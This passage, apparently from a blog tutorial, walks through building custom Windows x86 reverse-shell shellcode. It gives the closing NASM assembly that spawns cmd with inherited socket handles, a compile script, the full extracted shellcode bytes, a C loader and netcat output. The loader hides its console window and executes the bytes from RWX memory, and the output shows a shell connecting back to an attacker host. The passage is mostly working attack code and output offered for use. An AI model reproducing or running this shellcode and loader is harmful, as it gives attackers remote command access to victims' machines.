ADD  AL, 44                          ;cb => 0x44 (size of struct)
PUSH EAX                             ;eax points to STARTUPINFOA

;ProcessInfo struct
MOV  EAX, ESP                        ;pStartupInfo
PUSH EBX                             ;pProcessInfo
PUSH EAX                             ;pStartupInfo
PUSH EDX                             ;CurrentDirectory => NULL
PUSH EDX                             ;pEnvironment => NULL
PUSH EDX                             ;CreationFlags => 0
XOR  EAX, EAX                        ;zero out EAX register
INC  EAX                             ;EAX => 0x00000001
PUSH EAX                             ;InheritHandles => TRUE => 1
PUSH EDX                             ;pThreadAttributes => NULL
PUSH EDX                             ;pProcessAttributes => NULL
PUSH ECX                             ;pCommandLine => pointer to "cmd"
PUSH EDX                             ;ApplicationName => NULL
CALL EBP                             ;execute CreateProcessA
```

<p align="justify">
The above code will be saved inside a file named <code  style="background-color: lightgrey; color:black;"><b>rev.nasm</b></code> in order to be compiled and linked.

The following bash script <code  style="background-color: lightgrey; color:black;"><b>compile.sh</b></code> will be used for compilation and linking 
</p>


```bash
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f win32 $1.nasm -o $1.obj

echo '[+] Linking ...'
ld -o $1.exe $1.obj

echo '[+] Done!'
```

<p align="justify">
Then the shellcode will be produced as follows : 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
kali@kali:~/Desktop$ objdump -d ./testasm.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\x89\xde\xff\xd2\x83\xc4\x0c\x5a\x50\x52\x66\xba\x6c\x6c\x52\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x04\x68\x75\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50\x89\xc7\xff\xd2\x31\xdb\x66\xbb\x90\x01\x29\xdc\x54\x53\xff\xd0\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x64\x8b\x14\x1c\x68\x74\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x89\xf8\x50\xff\xd2\x57\x31\xc9\x52\x52\x52\xb2\x06\x52\x41\x51\x41\x51\xff\xd0\x91\x5f\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x63\x8b\x14\x1c\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03\x61\x68\x63\x6f\x6e\x6e\x54\x57\x87\xcd\xff\xd2\x68\xc0\xa8\xc9\x0b\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x55\x87\xef\xff\xd0\x83\xc4\x14\x31\xdb\x80\xc3\x04\x6b\xdb\x62\x8b\x14\x1c\x68\x73\x41\x61\x61\x81\x6c\x24\x02\x61\x61\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x89\xf5\x55\xff\xd2\x50\x8d\x28\x68\x63\x6d\x64\x61\x66\x83\x6c\x24\x03\x61\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x57\x57\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xff\xd5"
</pre>

<p align="justify">
At this point, in order to execute the above shellcode, we should create a STUB program in C which will deliver the execution. The following program will execute the reverse shellcode. 
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">

#include &lt;windows.h>
#include &lt;iostream>
#include &lt;stdlib.h>

char code[] = 
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31"
"\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f"
"\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde"
"\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53"
"\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54"
"\x53\x89\xde\xff\xd2\x83\xc4\x0c\x5a\x50\x52\x66\xba\x6c\x6c\x52\x68\x33"
"\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x04"
"\x68\x75\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74\x68"
"\x57\x53\x41\x53\x54\x50\x89\xc7\xff\xd2\x31\xdb\x66\xbb\x90\x01\x29\xdc"
"\x54\x53\xff\xd0\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x64\x8b\x14\x1c"
"\x68\x74\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x6b\x65\x68"
"\x57\x53\x41\x53\x54\x89\xf8\x50\xff\xd2\x57\x31\xc9\x52\x52\x52\xb2\x06"
"\x52\x41\x51\x41\x51\xff\xd0\x91\x5f\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b"
"\xdb\x63\x8b\x14\x1c\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03\x61\x68\x63"
"\x6f\x6e\x6e\x54\x57\x87\xcd\xff\xd2\x68\xc0\xa8\xc9\x0b\x66\x68\x11\x5c"
"\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x55\x87\xef\xff\xd0\x83"
"\xc4\x14\x31\xdb\x80\xc3\x04\x6b\xdb\x62\x8b\x14\x1c\x68\x73\x41\x61\x61"
"\x81\x6c\x24\x02\x61\x61\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72"
"\x68\x43\x72\x65\x61\x54\x89\xf5\x55\xff\xd2\x50\x8d\x28\x68\x63\x6d\x64"
"\x61\x66\x83\x6c\x24\x03\x61\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x57\x57"
"\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52"
"\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
"\x52\x52\x51\x52\xff\xd5";

int main(int argc, char** argv)
{
  HWND hWnd = GetConsoleWindow();
  ShowWindow(hWnd, SW_HIDE);
  void* exec = VirtualAlloc(0, strlen(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(exec, code, sizeof(code));
  ((void(*)())exec)();

  return 0;
}
</pre>


<p align="justify">
After compiling and running the above program we will have a fancy shell on our kali machine as seen at the screenshot below 
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
kali@kali:~/Desktop$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.201.11] from (UNKNOWN) [192.168.201.12] 60839
Microsoft Windows [Version 10.0.19043.1165]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Xenofon\source\repos\test\test>
</pre>
